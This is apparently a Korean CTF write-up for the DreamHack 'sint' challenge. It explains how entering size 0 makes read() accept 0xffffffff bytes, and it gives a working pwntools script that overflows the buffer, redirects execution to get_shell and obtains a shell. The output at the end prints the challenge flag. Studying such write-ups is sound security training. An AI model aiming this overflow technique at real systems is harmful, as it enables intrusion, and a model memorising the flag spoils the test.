# [DreamHack] sint

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(sint)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
> 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [sint.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549507/sint.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160315535-17427c2a-94ae-45c6-bb9a-ee938462fc4b.png)

## Analysis

```c
    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }
```

`size`를 입력받는다. 0보다 작거나 256보다 큰 값을 입력하면 프로세스를 종료한다.

```c
    printf("Data: ");
    read(0, buf, size - 1);
```

`size - 1`만큼 `buf`에 데이터를 입력받는다. 만약 `size`가 0이면 `0xffffffff`바이트를 입력받게 되어 BOF가 발생한다. `main()`의 return address를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/sint')
else:
    r = remote('host1.dreamhack.games', 15671)

get_shell = 0x8048659  # get_shell()

r.sendlineafter('Size: ', '0')
r.sendafter('Data: ', b'a' * 0x104 + p32(get_shell))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 15671: Done
[*] Switching to interactive mode
$ cat flag
DH{d66e84c453b960cfe37780e8ed9d70ab}
```